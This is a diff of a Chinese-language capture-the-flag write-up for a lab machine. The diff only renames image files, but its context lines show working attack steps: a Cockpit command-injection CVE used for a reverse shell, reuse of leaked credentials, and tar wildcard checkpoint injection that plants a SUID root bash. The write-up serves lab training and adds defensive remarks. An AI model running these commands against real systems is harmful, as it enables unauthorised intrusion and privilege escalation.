@@ -13,7 +13,7 @@
 | 初始漏洞 | CVE-2026-4802（Cockpit 日志过滤命令注入） |
 | 最终路径 | 遗留台账凭据 → Cockpit RCE → 日志泄露 cock 口令 → SSH → tar 通配符 → SUID bash → root |
 
-![首页与迁移注释线索](/content/mono/image-01.png)
+![首页与迁移注释线索](/content/mono/image-01.webp)
 
 ## 1. 攻击链概览
 
@@ -45,7 +45,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.66
 
 80 端口页面注释提到：`/monomono/node_inventory.html` 是遗留台账，Cockpit 迁移后旧凭据仍在。
 
-![页面注释指向遗留台账](/content/mono/image-04.png)
+![页面注释指向遗留台账](/content/mono/image-04.webp)
 
 访问台账页，直接拿到运维侧“复制友好”的凭据与漏洞提示：
 
@@ -54,11 +54,11 @@ nmap -sT -sV -sC -O -p- 192.168.134.66
 | Cockpit 运维控制台 | `https://TARGET-IP:8090/` | `svc_vpn` | `admin123`（低权限） |
 | Cockpit 日志页 | `https://TARGET-IP:8090/system/logs` | — | `CVE-2026-4802` |
 
-![遗留台账中的凭据与 CVE 提示](/content/mono/image-05.png)
+![遗留台账中的凭据与 CVE 提示](/content/mono/image-05.webp)
 
 用 `svc_vpn / admin123` 登录 8090 上的 Cockpit。
 
-![Cockpit 登录页](/content/mono/image-02.png) ![进入 Cockpit 控制台](/content/mono/image-03.png)
+![Cockpit 登录页](/content/mono/image-02.webp) ![进入 Cockpit 控制台](/content/mono/image-03.webp)
 
 ## 3. 利用：CVE-2026-4802 拿到 svc_vpn
 
@@ -66,11 +66,11 @@ nmap -sT -sV -sC -O -p- 192.168.134.66
 
 [hakaioffsec/CVE-2026-4802](https://github.com/hakaioffsec/CVE-2026-4802)
 
-![CVE-2026-4802 PoC 仓库](/content/mono/image-07.png) ![按 PoC 准备利用](/content/mono/image-06.png)
+![CVE-2026-4802 PoC 仓库](/content/mono/image-07.webp) ![按 PoC 准备利用](/content/mono/image-06.webp)
 
 结合已有 Cockpit 会话触发漏洞，反弹 / 拿到 `svc_vpn` 身份的 Shell。
 
-![CVE 利用后获得 svc_vpn Shell](/content/mono/image-08.png)
+![CVE 利用后获得 svc_vpn Shell](/content/mono/image-08.webp)
 
 > 风险说明：该漏洞打在已认证的 Cockpit 日志过滤接口上。未授权环境不要复现；靶场里也尽量用一次性回连验证，避免长期驻留。
 
@@ -89,7 +89,7 @@ sshpass -p 'Cock_Log_2026!' ssh -o StrictHostKeyChecking=no cock@127.0.0.1 \
   '/usr/local/bin/subscription-sync --once'
 ```
 
-![sync.log 泄露 cock 明文口令](/content/mono/image-09.png)
+![sync.log 泄露 cock 明文口令](/content/mono/image-09.webp)
 
 据此切换到 `cock`：
 
@@ -98,7 +98,7 @@ su - cock
 # Cock_Log_2026!
 ```
 
-![su 到 cock 用户](/content/mono/image-10.png)
+![su 到 cock 用户](/content/mono/image-10.webp)
 
 写入 SSH 公钥后，从攻击机稳定登录并拿到 user flag：
 
@@ -128,7 +128,7 @@ tar -czf <archive> *
 
 Shell 会先展开 `*`。若目录里存在以 `-` 开头的文件名，`tar` 会把它当成选项解析。利用 `--checkpoint` / `--checkpoint-action` 即可在打包时执行命令。
 
-![备份目录与 tar 通配符风险](/content/mono/image-11.png)
+![备份目录与 tar 通配符风险](/content/mono/image-11.webp)
 
 注意：`/tmp` 是 **nosuid** tmpfs，SUID bash 放那里无效。脚本应把结果写到根分区上的可写路径，例如 `/home/cock/.bashbak`。
 
@@ -140,7 +140,7 @@ printf '#!/bin/sh\ncp /bin/bash /home/cock/.bashbak\nchown root:root /home/cock/
 touch -- './--checkpoint=1' './--checkpoint-action=exec=sh pwn.sh'
 ```
 
-![植入 checkpoint 文件等待备份触发](/content/mono/image-12.png)
+![植入 checkpoint 文件等待备份触发](/content/mono/image-12.webp)
 
 等待下一轮备份（约 ≤60s）。`tar` 以 root 解析选项后，通过 `/bin/sh -c` 执行 `pwn.sh`。验证：
 
@@ -149,7 +149,7 @@ su - cock -c '/home/cock/.bashbak -p -c "id"'
 # uid=1002(cock) gid=1002(cock) euid=0(root)
 ```
 
-![SUID bash 获得 root](/content/mono/image-13.png)
+![SUID bash 获得 root](/content/mono/image-13.webp)
 
 > 防守视角：备份脚本不要对不可信目录使用未加保护的 `tar *`；应用日志也绝不该把 `sshpass -p` 明文口令打出来。
 
